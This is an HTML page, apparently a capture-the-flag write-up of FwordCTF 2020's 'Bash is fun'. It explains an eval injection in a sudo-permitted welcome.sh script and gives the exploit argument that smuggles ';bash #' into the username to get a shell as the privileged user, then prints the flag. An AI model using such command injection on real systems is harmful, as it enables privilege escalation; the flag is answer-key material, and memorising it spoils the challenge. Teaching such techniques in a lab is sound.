@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Bash is fun</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav>
+            <ul class="nav-menu nav-center">
+            <li><a href="#">CTFs <i class="arrow down"></i></a>
+                <ul>
+                <li><a href="#">FwordCTF_2020 <i class="arrow right"></i></a>
+                    <ul>
+                    <li><a href="#">bash <i class="arrow right"></i></a>
+                        <ul>
+                        <li><a href="/ctfs/fword_ctf2020/bash/bash_is_fun.html">bash is fun</a></li>
+                        <li><a href="/ctfs/fword_ctf2020/bash/jail_boss.html">jail boss</a></li>
+                        </ul>
+                    </li>
+                    </ul>
+                </li>
+                </ul>
+            </li>
+            <!-- <li><a href="#">example</a></li> -->
+            </ul>
+        </nav>
+    </div>
+
+    <hr />
+    
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Bash_is_fun_0"></a>Bash is fun</h1>
+<p class="has-line-data" data-line-start="1" data-line-end="2">You are provided with an SSH account to server <code>ssh -p 2222 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83e0f7e5c3e5f6ede1e2f0ebade5f4ecf1e7adf4f7e5">[email&#160;protected]</a></code>.</p>
+<p class="has-line-data" data-line-start="3" data-line-end="4">When we get a shell we are in a home directory.</p>
+<pre><code class="has-line-data" data-line-start="5" data-line-end="16">$ ls -lha
+total 32K
+drwxrwxr-t 1 root  user1           4.0K Aug 29 19:29 .
+drwxr-xr-x 1 root  root            4.0K Aug 29 19:29 ..
+-rw-r--r-- 1 user1 user1            220 May  5  2019 .bash_logout
+-rw-r--r-- 1 user1 user1           3.7K May  5  2019 .bashrc
+-rw-r--r-- 1 user1 user1            807 May  5  2019 .profile
+-rwxr----- 1 root  user-privileged   67 Aug 29 19:08 flag.txt
+-rwxr-xr-x 1 root  user-privileged  565 Aug 29 19:08 welcome.sh
+-rwxr-xr-x 1 root  root              62 Aug 29 19:08 welcome.txt
+</code></pre>
+<p class="has-line-data" data-line-start="17" data-line-end="18">We are</p>
+<pre><code class="has-line-data" data-line-start="19" data-line-end="22">$ id
+uid=1000(user1) gid=1000(user1) groups=1000(user1)
+</code></pre>
+<p class="has-line-data" data-line-start="23" data-line-end="24">We can run <code>sudo -l</code> to see if we can execute any program with elevated privileges.</p>
+<pre><code class="has-line-data" data-line-start="26" data-line-end="29">$ sudo -l
+    (user-privileged) NOPASSWD: /home/user1/welcome.sh
+</code></pre>
+<p class="has-line-data" data-line-start="30" data-line-end="31">We can run <code>welcome.sh</code> as user <code>user-privileged</code>. If we can somehow exploit the script, we can become user<code>user-privileged</code> and read the flag in file <code>flag.txt</code>.</p>
+<h1 class="code-line" data-line-start=32 data-line-end=33><a id="welcomesh_32"></a><code>welcome.sh</code></h1>
+<pre><code class="has-line-data" data-line-start="34" data-line-end="67" class="language-sh"><span class="hljs-shebang">#!/bin/bash</span>
+name=<span class="hljs-string">"greet"</span>
+<span class="hljs-keyword">while</span> [[ <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> =~ ^- &amp;&amp; ! <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> == <span class="hljs-string">"--"</span> ]]; <span class="hljs-keyword">do</span> <span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span>
+  -V | --version )
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Beta version"</span>
+    <span class="hljs-built_in">exit</span>
+    ;;
+  -n | --name )
+    <span class="hljs-built_in">shift</span>; name=<span class="hljs-variable">$1</span>
+    ;;
+  -u | --username )
+    <span class="hljs-built_in">shift</span>; username=<span class="hljs-variable">$1</span>
+    ;;
+  -p | --permission )
+     permission=<span class="hljs-number">1</span>
+     ;;
+<span class="hljs-keyword">esac</span>; <span class="hljs-built_in">shift</span>; <span class="hljs-keyword">done</span>
+<span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> == <span class="hljs-string">'--'</span> ]]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">shift</span>; <span class="hljs-keyword">fi</span>
+
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"Welcome To SysAdmin Welcomer \o/"</span>
+
+<span class="hljs-built_in">eval</span> <span class="hljs-string">"function <span class="hljs-variable">$name</span> { sed 's/user/<span class="hljs-variable">${username}</span>/g' welcome.txt ; }"</span>
+<span class="hljs-built_in">export</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$name</span>
+isNew=<span class="hljs-number">0</span>
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$isNew</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span> ]];<span class="hljs-keyword">then</span>
+    <span class="hljs-variable">$name</span>
+<span class="hljs-keyword">fi</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$permission</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span> ]];<span class="hljs-keyword">then</span>
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">"You are: "</span> 
+    id
+<span class="hljs-keyword">fi</span>
+</code></pre>
+<h2 class="code-line" data-line-start=68 data-line-end=69><a id="The_script_68"></a>The script</h2>
+<p class="has-line-data" data-line-start="69" data-line-end="71">In the beggining there are some operations to read our program options.<br>
+The only interesting, and most fun :), line of script is.</p>
+<pre><code class="has-line-data" data-line-start="73" data-line-end="75" class="language-sh"><span class="hljs-built_in">eval</span> <span class="hljs-string">"function <span class="hljs-variable">$name</span> { sed 's/user/<span class="hljs-variable">${username}</span>/g' welcome.txt ; }"</span>
+</code></pre>
+<p class="has-line-data" data-line-start="76" data-line-end="77">Eval is a builtin command that should never be used with user input or user controllable code, as it can be potentialy used to execute any arbitrary code. This is our way of exploiting the script.</p>
+<p class="has-line-data" data-line-start="78" data-line-end="79">Rest of the script is fairly irrelevant for us.</p>
+<h2 class="code-line" data-line-start=80 data-line-end=81><a id="Exploit_80"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="81" data-line-end="82">We can use parameter <code>--username</code> to inject any code we want to the eval function which will get executed.</p>
+<p class="has-line-data" data-line-start="83" data-line-end="84">We can start with something easy.</p>
+<pre><code class="has-line-data" data-line-start="86" data-line-end="88">$ ./welcome.sh --username &quot;#&quot;
+</code></pre>
+<p class="has-line-data" data-line-start="88" data-line-end="89">and script would execute this command</p>
+<pre><code class="has-line-data" data-line-start="90" data-line-end="92" class="language-sh"><span class="hljs-built_in">eval</span> <span class="hljs-string">"function <span class="hljs-variable">$name</span> { sed 's/user/#/g' welcome.txt ; }"</span>
+</code></pre>
+<p class="has-line-data" data-line-start="93" data-line-end="94">Frankly, this doesn’t do much.</p>
+<p class="has-line-data" data-line-start="95" data-line-end="97">Now we can potentially craft a command that would read a file or spawn new shell.<br>
+In order to run the script as <code>user-privileged</code> we have to use <code>sudo</code> with option <code>--user</code>.</p>
+<p class="has-line-data" data-line-start="98" data-line-end="99">Exploit</p>
+<pre><code class="has-line-data" data-line-start="100" data-line-end="102">$ sudo --user=user-privileged ./welcome.sh -u &quot;pwned/g' welcome.txt;};bash #&quot;
+</code></pre>
+<p class="has-line-data" data-line-start="102" data-line-end="103">and script would execute whis command</p>
+<pre><code class="has-line-data" data-line-start="104" data-line-end="106" class="language-sh"><span class="hljs-built_in">eval</span> <span class="hljs-string">"function <span class="hljs-variable">$name</span> { sed 's/user/pwned/g' welcome.txt;};bash #/g' welcome.txt ; }"</span>
+</code></pre>
+<p class="has-line-data" data-line-start="107" data-line-end="108">We successfuly complete <code>sed</code> command and end it with <code>;</code>. Then we are free to issue any command we like. We use <code>bash</code> so spawn a new shell. This shell would be spawned as user <code>user-privileged</code> because the script was running under this user. Finally, at the end, we use <code>#</code> to comment out the rest of the eval command (very similar to SQL injectino).</p>
+<h2 class="code-line" data-line-start=109 data-line-end=110><a id="In_action_109"></a>In action</h2>
+<pre><code class="has-line-data" data-line-start="111" data-line-end="116">$ sudo --user=user-privileged ./welcome.sh -u &quot;pwned/g' welcome.txt;};bash #&quot;
+Welcome To SysAdmin Welcomer \o/
+$ id
+uid=1001(user-privileged) gid=1001(user-privileged) groups=1001(user-privileged)
+</code></pre>
+<p class="has-line-data" data-line-start="117" data-line-end="118">We become user <code>user-privileged</code>. Now we can read our flag.</p>
+<pre><code class="has-line-data" data-line-start="120" data-line-end="123">$ cat flag.txt
+FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
+</code></pre>
+<h2 class="code-line" data-line-start=123 data-line-end=124><a id="Flag_123"></a>Flag</h2>
+<p class="has-line-data" data-line-start="124" data-line-end="125"><strong>FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}</strong></p>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+</body>
+
+</html>
